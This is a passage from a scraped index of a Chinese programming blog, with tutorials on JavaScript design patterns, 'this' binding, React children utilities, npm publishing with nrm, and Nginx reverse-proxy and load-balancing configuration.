login.listen(\u0026#39;loginSuccess\u0026#39;,showAvatar); login.listen(\u0026#39;loginSuccess\u0026#39;,showMessage); //发布 login.trigger(\u0026#39;loginSuccess\u0026#39;); //取消订阅 login.remove(\u0026#39;loginSuccess\u0026#39;,showAvatar); //再次发布 login.trigger(\u0026#39;loginSuccess\u0026#39;); 2-4 场景 按钮上绑定click事件 ajax解耦 3. 工厂模式 3-1 实现原理 工厂模式定义一个用于创建对象的接口，这个接口由子类决定实例化哪一个类。该模式使一个类的实例化延迟到了子类。 而子类可以重写接口方法以便创建的时候指定自己的对象类型\n3-2 分类 简单工厂模式 工厂方法模式 抽象工厂模式 分别是在各自基础上有一定的改进: 简单工厂模式解决了入口不统一的问题; 工厂模式解决了修改地点不统一的问题; 抽象工厂模式解决了子类实现不规范的问题\n3-3 coding function Animal(opts){ var obj = new Object(); obj.name = opts.name; obj.color = opts.color; obj.getInfo = function(){ return \u0026#39;名称：\u0026#39;+obj.name +\u0026#39;， 颜色：\u0026#39;+ obj.color; } return obj; } var cat = Animal({name: \u0026#39;波斯猫\u0026#39;, color: \u0026#39;白色\u0026#39;}); cat.getInfo(); 3-4 场景 简单说：假如我们想在网页面里插入一些元素，而这些元素类型不固定，可能是图片、链接、文本， 根据工厂模式的定义，在工厂模式下，工厂函数只需接受我们要创建的元素的类型，其他的工厂函数帮我们处理\n4. 策略模式 4-1 原理 俗话说，条条大路(策略)通罗马(result)。在现实生活中，我们可以采用很多方法实现同一个目标。 比如我们先定个小目标，先挣它一个亿。我们可以根据具体的实际情况(按照对应的策略)来完成这个目标\n4-2 coding // 某公司年终奖计算方式 var Strategies = { \u0026#34;A\u0026#34;:function(salary){ return salary * 5; }, \u0026#34;B\u0026#34;:function(salary){ return salary * 4; }, \u0026#34;C\u0026#34;:function(salary){ return salary * 3; } }; var caculateBonus = function(level,salary){ return Strategies[level](salary); }; console.log(caculateBonus(\u0026#34;A\u0026#34;,2000)); 4-3 场景 antd 中的message组件有info、success、error 表单校验 5. 代理模式 5-1 原理 为其他对象提供一种代理以控制对这个对象的访问\n5-2 分类 保护代理模式 虚拟代理模式 缓存代理模式 5-3 coding var Flower = function(){ this.price = 150 } var xiaoming = { sendflower: function(target){ var flower = new Flower() target.receiveFlower(flower ) } } var B = { receiveFlower: function(flower){ if(flower.price \u0026lt; 100){ console.log(\u0026#34;太便宜了，女神表示一脸嫌弃\u0026#34;) return false }else{ A.receiveFlower(flower) } }, } var A = { receiveFlower: function(){ console.log(\u0026#34;接受了鲜花\u0026#34;) } } xiaoming.sendFlower(B); 5-4 场景 保护过滤 缓存代理 - 一些开销比较大的运算结果提供暂时的存储 虚拟代理(一些开销很大的对象，延迟到真正需要它的时候才去创建) - 图片上传 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/computer-basics/02.js-design-pattern-i/","summary":"\u003cp\u003e一个模式就是一个可重用的方案。当代码是建立在行之有效的模式上时,我们可以花更少的时间去关心我们的代码结构,从而能花\u0026hellip;\u003c/p\u003e","title":"设计模式: 聊一聊JavaScript设计模式（一）"},{"content":"很重要的一句话 只有掌握了如何创建、关联和扩展对象，你才能用 JavaScript 创建类似谷歌地图这样大型的复杂应用\n一、这篇文章出现的背景 1. this在我们开发过程中的重要性(开发场景) \u0026ndash; 通过一段代码简单了解this 提供了一种更优雅的方式来隐式”传递”一个对象引用, 让API设计更加简洁和清晰\n首先来看一段代码, 此处不使用this, 需要给identify()和speak()显示的传入一个上下文对象:\n// 定义 you \u0026amp; me对象 var me = { name: \u0026#34;Kyle\u0026#34; }; var you = { name: \u0026#34;Reader\u0026#34; }; function identify(context) { return context.name.toUpperCase(); } function speak(context) { var greeting = \u0026#34;Hello, I\u0026#39;m \u0026#34; + identify( context ); console.log( greeting ); } identify( you ); // READER speak( me ); //hello, 我是 KYLE 使用this解决: 可以在不同的上下文对象(me 和 you)中重复使用函数identify()和speak()\nfunction identify() { return this.name.toUpperCase(); } function speak() { var greeting = \u0026#34;Hello, I\u0026#39;m \u0026#34; + identify.call( this ); console.log( greeting ); } identify.call( me ); // KYLE identify.call( you ); // READER speak.call( me ); // Hello, 我是 KYLE speak.call( you ); // Hello, 我是 READER 显然, 随着你的使用模式越来越复杂, 显式传递上下文对象会让代码变得越来越混乱, this可以让你的代码变得更优雅。 特别是当你使用对象(关联)和原型时, 利用this使得函数可以自动引用合适的上下文对象显的尤为重要\n2.两种错误的理解 this指向函数自身 this指向函数的作用域, 这个在某些情况下是正确的, 但是在其他情况下确实错误的 事实上, 一部分人认为\u0026quot;this既不指向函数自身也不指向函数的词法作用域\u0026quot;, 但是也是不对的, 在某 种情况下, this就指向函数自身, 也可能指向词法作用域\n3.本质 this是在运行(函数被调用)时发生绑定的,并不是在编写时绑定, 它的上下文取决于函数调用时的各种条件, 它指向什么完全取决于函数在哪里被调用\n二、this 绑定规则 \u0026amp; 优先级 简单来说, 有这大致四种\n由new调用(new绑定) 函数是否通过call、apply(显式绑定)或者硬绑定调用 函数是否在某个上下文对象中调用(隐式绑定) 默认绑定 1. 默认绑定 无法应用其他规则时的默认规则, 严格模式下绑定到undefined, 否则绑定到全局对象\n最常用的函数调用类型:独立函数调用\nfunction foo() { console.log( this.a ); } var a = 2; foo(); // 2 代码中, foo()是直接使用不带任何修饰的函数引用进行调用的,只能适用于this的默认绑定,无法应用其他规则, 因此this指向全局对象\n// 严格模式下 function foo() { \u0026#34;use strict\u0026#34;; console.log( this.a ); } var a = 2; foo(); // TypeError: this is undefined 所以, 不推荐这种写法。\n2. 隐式绑定 考虑调用位置是否有上下文对象,或者说是否被某个对象或者包含\n当函数引用有上下文对象时,隐式绑定规则会把函数调用中的this绑定到这个上下文对象\n必须在一个对象内部包含一个指向函数的属性，并通过这个属性间接引用函数，从而把 this 间接(隐式)绑定到这个对象上\nfunction foo() { console.log(this.a); } var obj = { a: 2, foo: foo }; obj.foo(); // 2 对象属性引用链中只有最后一层会影响调用位置, 即调用栈的末端\nfunction foo() { console.log( this.a ); } var obj2 = { a: 42, foo: foo }; var obj1 = { a: 2, obj2: obj2 }; obj1.obj2.foo(); // 42 3. 显示绑定 强制指定某些对象对函数进行调用，this则强制指向调用函数的对象\ncall(thisObj, arg1, arg2, arg3\u0026hellip;) apply(thisObj, argArr) ES5 中提供了内置的方法 硬绑定bind(thisObj) 显示绑定场景\nfunction foo() { console.log( this.a ); } var obj = { a:2 }; foo.call( obj ); // 2 硬绑定常用场景\nfunction foo(something) { console.log( this.a, something ); return this.a + something; } var obj = { a:2 }; var bar = foo.bind( obj ); var b = bar( 3 ); // 2 3 console.log( b ); // 5 4. new绑定 new方式优先级最高，只要是使用new方式来调用一个构造函数，this一定会指向new调用函数新创建的对象\nfunction foo(a) { this.a = a; } var bar = new foo(2); console.log( bar.a ); // 2 三、绑定例外 1. 箭头函数 实际原因是箭头函数根本没有自己的this\nthis指向的固定化，并不是因为箭头函数内部有绑定this的机制, 实际原因箭头函数没有自己的this，它的this是继承而来，默认指向在定义它时所处的对象(宿主对象)。 捕获其所在（即定义的位置）上下文的this值，作为自己的this值, 如果在当前的箭头函数作用域中找不到变量，就像上一级作用域里去找, 导致内部的this就是外层代码块的this\n// demo 1 function foo() { setTimeout(() =\u0026gt; { console.log(\u0026#39;id:\u0026#39;, this.id); }, 100); } var id = 21; foo.call({ id: 42 }) // id: 42 //demo 2 function Person() { this.name = \u0026#39;dog\u0026#39;; this.age = \u0026#39;18\u0026#39;; setTimeout( () =\u0026gt; { console.log(this); console.log(\u0026#39;my name:\u0026#39; + this.name + \u0026#39;\u0026amp; my age:\u0026#39; + this.age) }, 1000) } var p = Person(); 2. 被忽略的this 当被绑定的是null，则使用的是默认绑定规则\n// 如果你把 null 或者 undefined 作为 this 的绑定对象传入 call 、 apply 或者 bind ，这些值在调用时会被忽略， 实际应用的是默认绑定规则 function foo() { console.log( this.a ); } var a = 2222; foo.call( null ); // 2222 四、(隐式)绑定丢失 最常见的this绑定问题就是被隐式绑定的函数会丢失绑定对象,也是就说它会应用默认绑定,从而把this绑定到全局对象或者undefined上,取决于是否是严格模式\n1. 引用赋值丢失 function foo() { console.log( this.a ); } var obj = { a: 2, foo: foo }; var bar = obj.foo; // 函数别名! var a = \u0026#34;oops, global\u0026#34;; // a是全局对象的属性 bar(); // \u0026#34;oops, global\u0026#34; 虽然 bar 是 obj.foo 的一个引用，但是实际上，它引用的是 foo 函数本身，这就相当于：var bar = foo， obj对象只是一个中间桥梁， obj.foo只起到传递函数的作用，所以bar跟obj对象没有任何关系,此时的 bar() 其实是一个不带任何修饰的函数调用. 而bar本身又不带a属性，因此应用了默认绑定,最后a只能指向window.\n2. 传参丢失 function foo() { console.log( this.a ); } function doFoo(fn) { // fn其实引用的是foo fn(); // \u0026lt;-- 调用位置! } var obj = { a: 2, foo: foo }; var a = \u0026#34;oops, global\u0026#34;; // a是全局对象的属性 doFoo( obj.foo ); // \u0026#34;oops, global\u0026#34; 参数传递其实就是一种隐式赋值，因此我们传入函数时也会被隐式赋值，所以结果和上一 个例子一样\n3. 回调函数丢失 function thisTo(){ console.log(this.a); } var data={ a:2, foo:thisTo //通过属性引用this所在函数 }; var a=3;//全局属性 setTimeout(data.foo,100);// 3 所谓传参丢失，就是在将包含this的函数作为参数在函数中传递时，this指向改变\nsetTimeout函数的本来写法应该是setTimeout(function(){......},100)； 100ms后执行的函数都在“\u0026hellip;\u0026hellip;”中， 可以将要执行函数定义成var fun = function(){......}, 即:setTimeout(fun,100)，100ms后就有：fun()；所以此时此刻是data.foo作为一个参数，是这样的：setTimeout(thisTo,100);100ms过后执行thisTo()， 实际道理还跟1.1差不多，没有调用thisTo的对象，this只能指向window 实际上你没办法控制回调函数的执行方式,没有办法控制会影响绑定的调用位置. 因此, 回调函数丢失this绑定是非常常见的,甚至更加出乎意料的是,调用回调函数的函数可能会修改this,特别 是在一些流行的JavaScript库中时间处理器会把回调函数的this强制绑定到触发事件的DOM元素上\n总结 四种规则:\n由new调用(new绑定) 通过call、apply(显式绑定)或者硬绑定调用 函数是否在某个上下文对象中调用(隐式绑定) 默认绑定 特殊情况特殊处理:\n箭头函数 被忽略的this 绑定丢失 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/frontend-develop/js-unknown/","summary":"很重要的一句话 只有掌握了如何创建、关联和扩展对象，你才能用 JavaScript","title":"JavaScript之你不知道的this"},{"content":"react的核心是组件, 使得你可以利用jsx像嵌套HTML标签一样\u0026hellip;\nreact的核心是组件, 使得你可以利用jsx像嵌套HTML标签一样去使用这些组件。 然而在包含jsx的表达式中, props.children一直贯穿其中。 当你开始使用React时, 你一定认为props.children也就那么回事, 但是你错了\n1. Child components 子组件\n父组件 \u0026lt;MyContainer /\u0026gt; 包含了几个子组件 \u0026lt;MyComponent /\u0026gt;\n\u0026lt;MyContainer\u0026gt; \u0026lt;MyFirstComponent /\u0026gt; \u0026lt;MySecondComponent /\u0026gt; \u0026lt;/MyContainer\u0026gt; 这三个 Component 组件都成为了 MyContainer 的 props.children 。 使用一个表达式容器，父组件就能够渲染它们的子组件：\nclass MyContainer extends React.Component { render() { return \u0026lt;div\u0026gt;{this.props.children}\u0026lt;/div\u0026gt; } } 当然, 父组件可以决定不渲染任何的子组件或者在渲染之前对它们进行操作\n// 不管你将什么子组件传递给这个组件，它都只会显示“Hello world!” class OnlySayHellow extends React.Component { render() { return \u0026lt;h1\u0026gt;Hello world!\u0026lt;/h1\u0026gt; } } 2.child 可以是任何东西 React 中的 Children不一定是组件，它们可以是任何东西\nJSX表达式、JavaScript Expressions、Functions、Booleans, Null, and Undefined\nJSX表达式 // component + string \u0026lt;MyContainer\u0026gt; Here is a component: \u0026lt;MyFirstComponent /\u0026gt; Here is another component: \u0026lt;MySecondComponent /\u0026gt; \u0026lt;/MyContainer\u0026gt; 注意 JSX将会自动删除每行开头和结尾的空格，以及空行。它还会把字符串中间的空白行压缩为一个空格\n// 如下代码结果一致 // code 1 \u0026lt;MyComponent\u0026gt;say hellow!\u0026lt;/MyComponent\u0026gt; // code 2 \u0026lt;MyComponent\u0026gt; say hellow! \u0026lt;/MyComponent\u0026gt; // code 3 \u0026lt;MyComponent\u0026gt; say hellow! \u0026lt;/MyComponent\u0026gt; // code 4 \u0026lt;MyComponent\u0026gt; say hellow! \u0026lt;/MyComponent\u0026gt; JavaScript Expressions function Item(props) { return \u0026lt;li\u0026gt;{props.message}\u0026lt;/li\u0026gt;; } function TodoList() { const todos = [\u0026#39;finish doc\u0026#39;, \u0026#39;submit pr\u0026#39;, \u0026#39;nag dan to review\u0026#39;]; return ( \u0026lt;ul\u0026gt; {todos.map((message) =\u0026gt; \u0026lt;Item key={message} message={message} /\u0026gt;)} \u0026lt;/ul\u0026gt; ); } Functions 例如，如果你有一个自定义组件，你可以把它当作回调来做。\n// Calls the children callback numTimes to produce a repeated component function Repeat(props) { let items = []; for (let i = 0; i \u0026lt; props.numTimes; i++) { items.push(props.children(i)); } return \u0026lt;div\u0026gt;{items}\u0026lt;/div\u0026gt;; } function ListOfTenThings() { return ( \u0026lt;Repeat numTimes={10}\u0026gt; {(index) =\u0026gt; \u0026lt;div key={index}\u0026gt;This is item {index} in the list\u0026lt;/div\u0026gt;} \u0026lt;/Repeat\u0026gt; ); } Children passed to a custom component can be anything, as long as that component transforms them into something React can understand before rendering. This usage is not common, but it works if you want to stretch what JSX is capable of.\n传递给自定义组件的孩子可以是任何东西，只要组件将它们转换成某种反应就可以在呈现之前理解。 这种用法并不常见，但如果您想拉伸JSX所能使用的，它就可以工作\nBooleans, Null, and Undefined Are Ignored false, null, undefined, and true are valid children. They simply don’t render.\nfalse, null, undefined, 和 true都是有效的子代。他们只是不渲染。这些JSX表达式将全部呈现为 同一事物\n// bad code \u0026lt;div\u0026gt; {props.messages.length \u0026amp;\u0026amp; \u0026lt;MessageList messages={props.messages} /\u0026gt; } \u0026lt;/div\u0026gt; // good code \u0026lt;div\u0026gt; {props.messages.length \u0026gt; 0 \u0026amp;\u0026amp; \u0026lt;MessageList messages={props.messages} /\u0026gt; } \u0026lt;/div\u0026gt; One caveat is that some “falsy” values, such as the 0 number, are still rendered by React. For example, this code will not behave as you might expect because 0 will be printed when props.messages is an empty array. To fix this, make sure that the expression before \u0026amp;\u0026amp; is always bool\n为了处理 this.props.children 这个封闭的数据结构, React提供了一个顶层的API.\n3. React.Children.map 循环\n在对应数组的情况下能起作用，除此之外，当函数、对象或者任何东西作为children传递时， 也会起作用\nobject React.Children.map(object children, function fn [, object context]) // 使用方法： React.Children.map(this.props.children, function (child) { return \u0026lt;li\u0026gt;{child}\u0026lt;/li\u0026gt;; }) // 其他方法 this.props.children.forEach(function (child) { return \u0026lt;li\u0026gt;{child}\u0026lt;/li\u0026gt; }) 注意\nthis.props.children 的值有三种可能：如果当前组件没有子节点，它就是 undefined ; 如果有一个子节点，数据类型是 object ；如果有多个子节点，数据类型就是 array 。 所以，处理 this.props.children 的时候要小心\ndemo \u0026lt;IgnoreFirstChild /\u0026gt; 组件在这里会遍历所有的children，忽略第一个child然后返回其他的 class IgnoreFirstChild extends React.Component { render() { const children = this.props.children return ( \u0026lt;div\u0026gt; {React.Children.map(children, (child, i) =\u0026gt; { // Ignore the first child if (i \u0026lt; 1) return return child })} \u0026lt;/div\u0026gt; ) } } \u0026lt;IgnoreFirstChild\u0026gt; \u0026lt;h1\u0026gt;First\u0026lt;/h1\u0026gt; \u0026lt;h1\u0026gt;Second\u0026lt;/h1\u0026gt; // \u0026lt;- Only this is rendered \u0026lt;/IgnoreFirstChild\u0026gt; 在这种情况下，我们也可以使用 this.props.children.map 的方法。但是假如 this.props.children 是一个函数而不是一个数组，接着我们就会产生一个error！ \u0026ldquo;this.props.children.map is not a function\u0026rdquo;\nReact 提供一个工具方法 React.Children 来处理 this.props.children 。我们可以用 React.Children.map 来遍历子节点，而不用担心 this.props.children 的数据类型是 undefined 还是 object, 甚至是function. 使用 React.Children.map 函数，无论什么都不会报错\n4. React.Children.forEach 循环 类似于 React.Children.map(), 但是不返回对象\nReact.Children.forEach(object children, function fn [, object context]) 5. React.Children.count 计数 因为this.props.children 可以是任何类型的，检查一个组件有多少个children是非常困难的\nobject React.Children.only(object children) 不要天真的以为, 可以使用this.props.children.length, 当传递的是字符串或者 函数时程序中断可能会让你哭！\n假设我们有个child：\u0026quot;say hello!\u0026quot; ，但是使用 .length 的方法将会显示为10。\nclass ChildrenCounter extends React.Component { render() { console.log(React.Children.count(this.props.children)); return \u0026lt;p\u0026gt;{this.props.children}\u0026lt;/p\u0026gt; } } \u0026lt;ChildrenCounter\u0026gt; {() =\u0026gt; \u0026lt;div\u0026gt;First!\u0026lt;/div\u0026gt;} \u0026lt;p\u0026gt;Second!\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;Third!\u0026lt;/p\u0026gt; \u0026lt;/ChildrenCounter\u0026gt; 注意: 此处console结果可能为2或者3, 有的地方会报错 \u0026ldquo;Functions are not valid as a React child\u0026rdquo;, 此时count为2, 若不报错, 则为3\n6. React.Children.toArray 转换为数组 可以通过 React.Children.toArray 方法将children转换为数组, 如果你 需要对它们进行排序，这个方法是非常有用的\nclass Sort extends React.Component { render() { const children = React.Children.toArray(this.props.children) // Sort and render the children return \u0026lt;p\u0026gt;{children.sort().join(\u0026#39; \u0026#39;)}\u0026lt;/p\u0026gt; } } \u0026lt;Sort\u0026gt; // We use expression containers to make sure our strings // are passed as three children, not as one string {\u0026#39;bananas\u0026#39;}{\u0026#39;oranges\u0026#39;}{\u0026#39;apples\u0026#39;} \u0026lt;/Sort\u0026gt; // 渲染为三个排好序的字符串 apples bananas oranges 7. React.Children.only 执行单一child\nobject React.Children.only(object children) 返回 children 中 仅有的子级, 否则抛出异常。这里仅有的子级, only方法接受的参数只能 是一个对象，不能是多个对象（数组）\nclass Executioner extends React.Component { render() { return React.Children.only(this.props.children)() } } 这样只会返回一个child。如果不止一个child，它就会抛出错误，让整个程序陷入中断——完美 的避开了试图破坏组件的懒惰的开发者\n8. renderChildren 改变children的属性\nclass RadioGroup extends React.Component { constructor() { super() // Bind the method to the component context this.renderChildren = this.renderChildren.bind(this) } renderChildren() { return React.Children.map(this.props.children, child =\u0026gt; { // TODO: Change the name prop to this.props.name return child }) } render() { return ( \u0026lt;div className=\u0026#34;group\u0026#34;\u0026gt; {this.renderChildren()} \u0026lt;/div\u0026gt; ) } } 9. React.cloneElement 永恒地克隆元素\n给每一个child增加一个name属性\nrenderChildren() { return React.Children.map(this.props.children, child =\u0026gt; { return React.cloneElement(child, { name: this.props.name }) }) } 这个场景就是RadioGroup的实现原理\n\u0026lt;RadioGroup name=\u0026#34;sex\u0026#34;\u0026gt; \u0026lt;Radio value=\u0026#34;boy\u0026#34;\u0026gt;First\u0026lt;/Radio\u0026gt; \u0026lt;Radio value=\u0026#34;girl\u0026#34;\u0026gt;Second\u0026lt;/Radio\u0026gt; \u0026lt;/RadioGroup\u0026gt; 传递一个唯一的 name 给RadioGroup, 相当于给其内每一个radio增加name属性, 属于同一组\n参考 react官方文档 A deep dive into children in React 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/frontend-develop/react-children/","summary":"\u003cp\u003ereact的核心是组件, 使得你可以利用jsx像嵌套HTML标签一样\u0026hellip;\u003c/p\u003e","title":"对React children 的深入理解"},{"content":"node 作为当前最受欢迎的\u0026quot;js版\u0026quot;后端开发语言之一，无论是业务开发，还是自动化构建部署，使用是很频繁的。但是\u0026hellip;\n一、镜像源 1. 管理常用镜像源 官方: http://registry.npmjs.org 淘宝: https://registry.npm.taobao.org zto: http://npm.ztosys.com/ $ npm config get registry // 查看 $ npm config set registry \u0026lt;镜像源\u0026gt; // 查看 2.nrm 优势：传统方法切回官方源的话要重写设置源的地址指向，执行 npm config set registry https://registry.npmjs.org；nrm 可以让我们快速切换源，更便于管理，下文中介绍了一些常用命令:\nnrm 安装\n$ npm install nrm -g nrm 常用命令：\n$ nrm ls // 列出可用的源，带*号即为当前使用的配置 $ nrm current // 查看当前使用的源 $ nrm use [源的别名] // 切到源，例如我们要使用淘宝源：nrm use taobao $ nrm add [源的别名] [源的地址] // 添加私有 npm 源，例如添加我司私有源：nrm add zto http://npm.ztosys.com/ $ nrm test [源的别名] // 测试速度 $ nrm del [源的别名] // 删除源，例如：nrm del zto 二、npm包管理 1.发布流程 1.1 初始化 package.json $ npm init 结果:\n{ \u0026#34;name\u0026#34;: \u0026#34;react-pc-ui\u0026#34;, // 包名 \u0026#34;version\u0026#34;: \u0026#34;1.0.1\u0026#34;, // 版本号 \u0026#34;description\u0026#34;: \u0026#34;\\\u0026#34;React PC 组件库(React pc component library)\\\u0026#34;\u0026#34;, \u0026#34;main\u0026#34;: \u0026#34;index.js\u0026#34;, // publish 入口 \u0026#34;scripts\u0026#34;: { \u0026#34;start\u0026#34;: \u0026#34;webpack-dev-server --open --config ./build/webpack.dev.config.js\u0026#34;, \u0026#34;build:component\u0026#34;: \u0026#34;webpack --config ./build/webpack.dist.component.config.js\u0026#34;, \u0026#34;test\u0026#34;: \u0026#34;echo \\\u0026#34;Error: no test specified\\\u0026#34; \u0026amp;\u0026amp; exit 1\u0026#34; }, \u0026#34;repository\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;git\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://github.com/xxx/xxx.git\u0026#34;, \u0026#34;webpack\u0026#34;: \u0026#34;v4.6.0\u0026#34;, \u0026#34;webpack-cli\u0026#34;: \u0026#34;^2.0.14\u0026#34;, \u0026#34;node\u0026#34;: \u0026#34;v8.11.1\u0026#34;, \u0026#34;npm\u0026#34;: \u0026#34;v5.6.0\u0026#34; }, \u0026#34;keywords\u0026#34;: [ \u0026#34;React\u0026#34;, ... ], \u0026#34;author\u0026#34;: \u0026#34;https://github.com/lianpf\u0026#34;, \u0026#34;license\u0026#34;: \u0026#34;ISC\u0026#34;, \u0026#34;devDependencies\u0026#34;: { \u0026#34;uglifyjs-webpack-plugin\u0026#34;: \u0026#34;^1.2.5\u0026#34;, \u0026#34;webpack\u0026#34;: \u0026#34;^4.6.0\u0026#34;, ... }, \u0026#34;dependencies\u0026#34;: { \u0026#34;react\u0026#34;: \u0026#34;^16.3.2\u0026#34;, \u0026#34;redux\u0026#34;: \u0026#34;^4.0.0\u0026#34;, ... } } name：填写你这个包的名字，默认是你这个文件夹的名字。不过这里要着重说一下，最好先去npm上找一下有没有同名的包。最好的测试方式就是，在命令行里面输入npm install 你要取的名字，如果报错，那么很好，npm上没有跟你同名的包，你可以放心大胆地把包发布出去。如果成功下载下来了。那么很不幸，改名字吧。 version：你这个包的版本，默认是1.0.0 description：描述你的包是干嘛用的 main：入口文件，默认是Index.js，你也可以自己填写你自己的文件名 test command：测试命令，这个直接回车就好了，目前还不需要 git repository：这个是git仓库地址, 如果没有的话，直接回车继续。 keyword：这个是一个重点，这个关系到有多少人会搜到你的npm包。尽量使用贴切的关键字作为这个包的索引 author：写你的账号或者你的github账号吧 license：开源文件, 直接回车 1.2 验证/登录npmjs账号 切换到官方源 或 要发布到的私有源\n初次\n$ npm adduser 非初次\n$ npm login 1.3 发布（普通包、测试包、@开头命名公有包）和验证 1.3.1 publish之前 你需要在你package.json文件的入口文件(我的是index.js)增加一段代码:\nmodule.exports = require(\u0026#39;./lib\u0026#39;) 不要问我为什么要这么做，因为你npm install其他包的时候，其他包里面的也是这样写\n还有如果你这次仅仅是想测试这个流程, 包里没有什么实质性的内容的话, 那么这个文件里可以直接写这么一句 hello world\nexports.sayHello = function() { return \u0026#39;Hello World\u0026#39;; } 1.3.2 publish 选择你要发布的包所在的项目, 以我的为例(包在react-pc-ui下):\nlianpf$ cd react-pc-ui [react-pc-ui] lianpf$ npm publish 1.3.3 发布测试包 测试包中的package.json修改为 \u0026quot;version\u0026quot;: \u0026quot;1.0.0-beta.1\u0026quot; 执行 npm publish --tag=beta 1.3.4 发布以@开头命名的public公有包 @Organization 代表某个组织，类似@babel、@angular等。没有对应机构的允许，无法发布包：error You must sign up for private packages：@***/***\n解决办法： 作为公共包发布 npm publish --access public\n1.3.5 验证安装 $ npm install xxx --save-dev 1.4 可能遇到的问题 1.4.1 镜像问题 no_perms Private mode enable, only admin can publish this module 或者publish成功, 但是npm.js个人信息哪里查看不到包\n那么可能是你用了国内的镜像地址了，只需要重新把地址注册回npmjs即可\n$ npm config // 查看所有配置相关的可用命令 $ npm config get registry // 查看镜像 $ npm config set registry http://registry.npmjs.org // 重新把地址注册回npmjs 发布之后, 再重新设置为淘宝镜像或者你们公司自己的镜像\n1.4.2 命名问题 npm ERR! you do not have permission to publish \u0026#34;your module name\u0026#34;. Are you logged in as the correct user? 提示没有权限，其实就是你的module名在npm上已经被占用啦，这时候你就去需要去https://www.npmjs.com搜索你的模块名称，如果搜索不到，就可以用， 并且把package.json里的name修改过来，重新npm publish，看到如下信息就表示安装完成了，rc-fullpage就是我的模块名\n2. 撤回npm包 官方可撤回publish操作24h内的包，私有源视自行判断。但撤回操作均不可逆，请谨慎为之。\n撤回指定版本模块 $ npm unpublish [@已发布的完整包名@版本号] --force // 例： npm unpublish @zto/xxx@1.0.0 --force 删除整个模块 $ npm unpublish [@已发布的完整包名]--force // 例： npm unpublish @zto/xxx --force 3. 版本号规范 主要规则版本格式：主版本号.次版本号.修订号，版本号递增规则如下\n主版本号：当你做了不兼容的 API 修改， 次版本号：当你做了向下兼容的功能性新增， 修订号：当你做了向下兼容的问题修正 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n","permalink":"https://lianpf.github.io/posts/other/npm-package-nrmimagesourcemanage/","summary":"\u003cp\u003enode 作为当前最受欢迎的\u0026quot;js版\u0026quot;后端开发语言之一，无论是业务开发，还是自动化构建部署，使用是很频繁的。但是\u0026hellip;\u003c/p\u003e","title":"Node: npm包和nrm管理镜像源"},{"content":"常用基础命令和Nginx Demo配置过程记录\u0026hellip;\n一、Common Commands（常用命令） $ nginx # 启动 $ nginx -s stop # 快速停止 $ nginx -s quit # 平稳退出 $ nginx -s reload # 重新加载配置文件命令(当配置文件修改后，可执行此命令) $ nginx -t # 测试nginx.conf配置 brew安装nginx，更多命令参考: 工具: Homebrew | Blogs\n$ brew search nginx # 搜索具体的程序包 $ brew install nginx # 安装具体的程序包 $ brew info nginx # 查看具体程序的信息 $ brew uninstall nginx # 卸载具体的应用 二、Nginx Demo反向代理配置过程 硬件 mac server node 1.启动一个node server node server 配置\n端口号设置为 8080\n请求地址 http://localhost\n2.安装、配置和测试 $ brew install nginx //安装nginx $ brew info nginx //查看nginx信息(安装路径) 输出nginx config地址为\n$ /usr/local/etc/nginx/nginx.conf # 或/etc/nginx/nginx.conf 在文件里面添加\nserver { listen 8080; //你要监听的端口号 server_name [你要监听的域名/IP]; location / { proxy_pass http://127.0.0.1:8085; //代理的目标地址 } } conf文件中有示例的server，可以添加多个serve\ntest: 访问http://127.0.0.1:8085和http://localhost:8080返回response一致\n最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n","permalink":"https://lianpf.github.io/posts/backend-develop/nginx-reverseproxy/","summary":"\u003cp\u003e常用基础命令和\u003ccode\u003eNginx Demo\u003c/code\u003e配置过程记录\u0026hellip;\u003c/p\u003e","title":"Nginx: 常用命令和反向代理配置"},{"content":"node 作为当前最受欢迎的\u0026quot;js版\u0026quot;后端开发语言之一，无论是业务开发，还是自动化构建部署，使用是很频繁的。但是\u0026hellip;\n能做什么 反向代理 负载均衡 HTTP服务器（包含动静分离） 正向代理 反向代理 反向代理应该是Nginx做的最多的一件事了，什么是反向代理呢，以下是百度百科的说法：反向代理（Reverse Proxy）方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。简单来说就是真实的服务器不能直接被外部网络访问，所以需要一台代理服务器，而代理服务器能被外部网络访问的同时又跟真实服务器在同一个网络环境，当然也可能是同一台服务器，端口不同而已。 下面贴上一段简单的实现反向代理的代码\nserver { listen 80; server_name localhost; client_max_body_size 1024M; location / { proxy_pass http://localhost:8080; proxy_set_header Host $host:$server_port; } } 保存配置文件后启动Nginx，这样当我们访问localhost的时候，就相当于访问localhost:8080了\n负载均衡 负载均衡也是Nginx常用的一个功能，负载均衡其意思就是分摊到多个操作单元上进行执行，例如Web服务器、FTP服务器、企业关键应用服务器和其它关键任务服务器等，从而共同完成工作任务。简单而言就是当有2台或以上服务器时，根据规则随机的将请求分发到指定的服务器上处理，负载均衡配置一般都需要同时配置反向代理，通过反向代理跳转到负载均衡。而Nginx目前支持自带3种负载均衡策略，还有2种常用的第三方策略。\n1、RR（默认） 每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除\n简单配置\nupstream test { server localhost:8080; server localhost:8081; } server { listen 81; server_name localhost; client_max_body_size 1024M; location / { proxy_pass http://test; proxy_set_header Host $host:$server_port; } } 负载均衡的核心代码为\nupstream test { server localhost:8080; server localhost:8081; } 